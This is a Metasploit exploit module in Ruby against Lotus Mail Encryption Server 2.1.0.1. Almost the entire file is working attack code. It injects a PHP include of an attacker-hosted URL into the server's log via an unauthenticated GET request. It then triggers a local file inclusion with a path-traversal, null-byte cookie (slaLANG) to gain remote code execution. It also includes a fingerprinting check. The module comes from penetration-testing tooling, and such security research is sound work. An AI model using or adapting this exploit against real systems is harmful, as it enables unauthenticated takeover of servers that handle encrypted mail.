# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer::PHPInclude
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Lotus Mail Encryption Server (Protector for Mail) Local File Inclusion&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a local file inclusion vulnerability in
                the Lotus Mail Encryption Server (Protector for Mail Encryption)
                administration setup interface. The index.php file uses an unsafe include()
                where an unauthenticated remote user may read (traversal) arbitrary file contents.
                By abusing a second bug within Lotus, we can inject our payload
                into a known location and call it via the LFI to gain remote code execution.
                Version 2.1.0.1 Build(88.3.0.1.4323) is known to be vulnerable.
                You may need to set DATE in the format YYYY-MM-DD to get this working,
                where the remote host and metasploit instance have UTC timezone differences.
            },
            &#039;Author&#039;         => [ &#039;patrick&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.osisecurity.com.au/advisories/&#039; ], #0day
                    #[ &#039;CVE&#039;, &#039;X&#039; ],
                    [ &#039;OSVDB&#039;, &#039;87556&#039;],
                    #[ &#039;BID&#039;, &#039;X&#039; ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Lotus Mail Encryption Server 2.1.0.1&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Nov 9 2012&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
            [
                Opt::RPORT(9000),
                OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
                OptString.new("DATE", [false, &#039;The date of the target system log file in YYYY-MM-DD format&#039;]),
            ], self.class)
    end
 
    def check
        res = send_request_cgi( { &#039;uri&#039; => &#039;/&#039; })
        if (res.code == 302 && res.body.match(/GetLoginScreen.uevent/))
            return Exploit::CheckCode::Detected
        end
        return Exploit::CheckCode::Safe
    end
 
    def php_exploit
 
        logfile = datastore[&#039;DATE&#039;] ? datastore[&#039;DATE&#039;] : Time.now.strftime("%Y-%m-%d")
        if (logfile !~ /\d\d\d\d-\d\d-\d\d/) # if set by user datastore...
            print_error("DATE is in incorrect format (use &#039;YYYY-MM-DD&#039;). Unable to continue.")
            return
        end
 
        # set up the initial log file RCE - this is unescaped ascii so we can execute it
        # later >:) uid is tomcat so we cannot read apache&#039;s logs, and we are stuck inside
        # filesystem. example good injected log: &#039;/var/log/ovid/omf-2012-08-01.log&#039; patrick
 
        inject_url = "/omc/GetSetupScreen.event?setupPage=<?php+include+&#039;#{php_include_url}&#039;;+?>" # no whitespace
        res = send_request_cgi( { &#039;uri&#039; => inject_url })
 
        if (res and res.code == 404 and res.body.match(/Lotus Protector for Mail Encryption - Page Not Found/)) # it returns a 404 but this is good.
            vprint_good("Payload injected...")
 
            response = send_request_cgi( {
                &#039;uri&#039; => &#039;/omc/pme/index.php&#039;,
                &#039;cookie&#039; => "slaLANG=../../../../../../var/log/ovid/omf-#{logfile}.log%00;", # discard .php
            })
        end
    end
end

